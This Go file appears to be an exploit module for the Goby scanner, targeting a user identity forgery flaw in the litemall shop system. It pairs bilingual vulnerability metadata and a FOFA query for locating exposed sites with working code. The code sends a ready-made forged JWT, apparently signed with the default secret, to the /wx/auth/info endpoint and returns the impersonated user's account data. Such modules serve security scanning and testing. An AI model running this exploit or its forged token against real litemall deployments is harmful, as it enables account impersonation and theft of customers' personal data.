package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "litemall 20220508 User Identity Forgery Vulnerability",
    "Description": "<p>Another small mall. litemall = Spring Boot backend + Vue admin frontend + WeChat applet user frontend + Vue user mobile end</p><p>There is an identity forgery vulnerability in litemall, which allows attackers to forge user identities to operate.</p>",
    "Impact": "litemall 20220508 User Identity Forgery Vulnerability",
    "Recommendation": "<p> There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://gitee.com/linlinjava/litemall\">https://gitee.com/linlinjava/litemall</a></p><p>1. Modify the default jwt secret. The jwt secret should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "litemall",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "litemall 20220508 身份认证绕过漏洞",
            "Description": "<p>litemall <span style=\"color: rgb(22, 51, 102); font-size: 16px;\"></span>&nbsp;是一个简单的商场系统，包含小程序客户端、移动客户端和网页管理端。技术采用Spring Boot后端 + Vue管理员前端 + 微信小程序用户前端 + Vue用户移动端。<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">litemall&nbsp;存在身份伪造漏洞，攻击者可以通过该漏洞伪造用户身份进行操作。</span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">litemall&nbsp;</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">存在身份伪造漏洞，</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可以通过该漏洞伪造用户身份进行操作。</span><br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://gitee.com/linlinjava/litemall\" target=\"_blank\">https://gitee.com/linlinjava/litemall</a><br></p><p>1、<span style=\"color: var(--primaryFont-color); font-size: 16px;\">修改 jwt&nbsp;</span><span style=\"color: var(--primaryFont-color); font-size: 16px;\">secret 密钥，<span style=\"color: var(--primaryFont-color);\">jwt&nbsp;</span><span style=\"color: var(--primaryFont-color);\">secret 密钥</span>最好包含大小写字母、数字和特殊字符等，且位数大于8位。</span><a href=\"https://github.com/sylabs/sif\"></a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Product": "litemall",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "litemall 20220508 User Identity Forgery Vulnerability",
            "Description": "<p>Another small mall. litemall = Spring Boot backend + Vue admin frontend + WeChat applet user frontend + Vue user mobile end</p><p>There is an identity forgery vulnerability in litemall, which allows attackers to forge user identities to operate.</p>",
            "Impact": "litemall 20220508 User Identity Forgery Vulnerability",
            "Recommendation": "<p>&nbsp;There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"https://gitee.com/linlinjava/litemall\" target=\"_blank\">https://gitee.com/linlinjava/litemall</a><br></p><p>1. Modify the default jwt secret. The <span style=\"color: rgb(22, 51, 102); font-size: 16px;\">jwt secret&nbsp;</span>should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Product": "litemall",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "title=\"litemall\"",
    "GobyQuery": "title=\"litemall\"",
    "Author": "834714370@qq.com",
    "Homepage": "https://gitee.com/linlinjava/litemall",
    "DisclosureDate": "2022-05-08",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.7",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "Token",
            "type": "input",
            "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0aGlzIGlzIGxpdGVtYWxsIHRva2VuIiwiYXVkIjoiTUlOSUFQUCIsImlzcyI6IkxJVEVNQUxMIiwiZXhwIjo0Nzc2MTQ2NzQ5LCJ1c2VySWQiOjEsImlhdCI6MTY1MjAwMTk0OX0.0nWPj0ckkD8fZ9AuRwQ8hXtOSgSTHK3bfTL4-Y7itok",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10670"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			config := httpclient.NewGetRequestConfig("/wx/auth/info")
			config.Header.Store("X-Litemall-Token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0aGlzIGlzIGxpdGVtYWxsIHRva2VuIiwiYXVkIjoiTUlOSUFQUCIsImlzcyI6IkxJVEVNQUxMIiwiZXhwIjo0Nzc2MTQ2NzQ5LCJ1c2VySWQiOjEsImlhdCI6MTY1MjAwMTk0OX0.0nWPj0ckkD8fZ9AuRwQ8hXtOSgSTHK3bfTL4-Y7itok")
			resp, err := httpclient.DoHttpRequest(hostinfo, config)
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "nickName") && strings.Contains(resp.Utf8Html, "成功") && strings.Contains(resp.Utf8Html, "\"errno\":0")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			token := stepLogs.Params["Token"].(string)
			config := httpclient.NewGetRequestConfig("/wx/auth/info")
			config.Header.Store("X-Litemall-Token", token)
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, config)
			if err != nil {
				return expResult
			}
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "nickName") && strings.Contains(resp.Utf8Html, "成功") && strings.Contains(resp.Utf8Html, "\"errno\":0") {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
